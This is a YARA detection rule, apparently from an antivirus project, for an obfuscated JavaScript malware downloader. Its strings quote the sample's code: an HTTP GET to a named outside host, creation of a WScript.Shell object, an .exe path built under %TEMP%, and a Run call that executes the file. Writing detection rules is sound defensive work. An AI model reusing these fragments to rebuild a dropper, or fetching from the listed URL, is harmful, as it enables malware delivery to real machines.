rule sig_20160330_d2d3500eb1e83bdcb47b819966079586 {
  meta:
    description = "datamaliciousorder - file 20160330_d2d3500eb1e83bdcb47b819966079586.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "892b7d1a00ab2854ec6cb2e8400a662f87bfcaeeb4fb6c8bc94b3e5c51d74479"

  strings:
    $s1  = "_JY[_W](\"GET\", \"http://assura-courtage.org/j2osla\", false);" fullword ascii
    $s2  = "var _NX = function _Y() {return WScript[_Y0](\"WScript\"+\".Shell\");}(), _KK = 11;" fullword ascii
    $s3  = "function _D(_NG, _FZ){_L = _L * 1; return _NG - _FZ;};" fullword ascii
    $s4  = "if (_JY[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _F() {return _NX[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"TvcMOlsJQ.ex\" + \"e\";};" fullword ascii
    $s6  = "function _H0(){return _H1 + \"\";};" fullword ascii
    $s7  = "function _EK(_T){_NX[\"Run\"](_T, _L, _L);};" fullword ascii
    $s8  = "function _H() {return ((_LO == true) && (_LO == _IY)) ? 1 : _L;};" fullword ascii
    $s9  = " while (_X){" fullword ascii
    $s10 = "function _VX(_UT) {var _ZR = (1, 2, 3, 4, 5, _UT); return _ZR;};" fullword ascii
    $s11 = "var _DU = new this[\"Date\"]();" fullword ascii
    $s12 = "function _OV()" fullword ascii
    $s13 = "function _B(){return _Y0;};" fullword ascii
    $s14 = "return _D(_TZ, _Y1);" fullword ascii
    $s15 = "function _F0(){return 22;};" fullword ascii
    $s16 = "var _R = false;" fullword ascii
    $s17 = "var _IY = false;" fullword ascii
    $s18 = "_LO = true; " fullword ascii
    $s19 = "_IY = true; " fullword ascii
    $s20 = "var _LO = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}